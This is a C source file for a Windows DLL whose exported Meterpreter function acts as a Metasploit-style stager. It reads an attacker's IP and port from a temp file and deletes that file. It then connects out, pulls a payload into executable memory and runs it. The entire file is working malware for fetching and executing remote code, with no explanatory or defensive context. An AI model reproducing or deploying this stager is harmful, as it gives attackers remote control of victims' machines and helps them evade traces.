#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "ws2_32")

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>


__declspec(dllexport) void __cdecl Meterpreter()
{
	ULONG32 size;
	WORD dwPort;
	LPSTR StageBuffer;
	struct sockaddr_in hax;
	SOCKET s1;
	void(*msf)();
	
	/* Read Meterpreter Parameters from config file. */
	FILE *stream;
	CHAR chRemoteIp[16];

	WCHAR chTmpFile[MAX_PATH];
	GetTempPathW(MAX_PATH, chTmpFile);
	wcscat_s(chTmpFile, sizeof(chTmpFile) / sizeof(wchar_t), L"tmpBLABLA.tmp");

	_wfopen_s(&stream, chTmpFile, L"r");
	fscanf_s(stream, "%s", chRemoteIp, 16);
	fscanf_s(stream, "%d", &dwPort);
	fclose(stream);
	LPCSTR lpIpAddress = chRemoteIp;
	DeleteFileW(chTmpFile);

	/* The WSAStartup function initiates use of the Winsock DLL by a process. */
	WSADATA	wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) < 0) {
		WSACleanup();
		exit(1);
	}

	/* The WSASocket function creates a socket that is bound to a specific transport-service provider. */
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
		(unsigned int)NULL, (unsigned int)NULL);

	/* Copy our target information into the Socket Structure. */
	hax.sin_family = AF_INET;
	hax.sin_port = htons(dwPort);
	hax.sin_addr.s_addr = inet_addr(lpIpAddress);

	/* Attempt to connect. */
	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	/* Read the 4-byte length. */
	recv(s1, (LPSTR)&size, 4, 0);

	/* Allocate a RWX Buffer */
	const size_t pageSize = size + 10;
	DWORD flags = MEM_COMMIT | MEM_RESERVE;
	StageBuffer = (LPSTR)VirtualAlloc(NULL, pageSize, flags, PAGE_EXECUTE_READWRITE);

	/* Prepend a little assembly to move our SOCKET value to the EDI register.
	48 BF 78 56 34 12 00 00 00 00  =>   mov rdi, 0x12345678 */
	StageBuffer[0] = 0x48;
	StageBuffer[1] = 0xBF;

	/* Copy the value of our Socket to the buffer. */
	memcpy(StageBuffer + 2, &s1, 4);

	/* Read bytes into the buffer. */
	DWORD tret = 0;
	DWORD nret = 0;
	LPSTR startb = StageBuffer + 10;

	/* Attempt to receive all of the requested data from the Socket. */
	while (tret < size) {
		nret = recv(s1, startb, size - tret, 0);
		startb += nret;
		tret += nret;
	}

	/* Cast our buffer as a function and call it. */
	msf = (void(*)())StageBuffer;
	msf();

}


BOOL APIENTRY DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpReserved)   // reserved
{
	
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
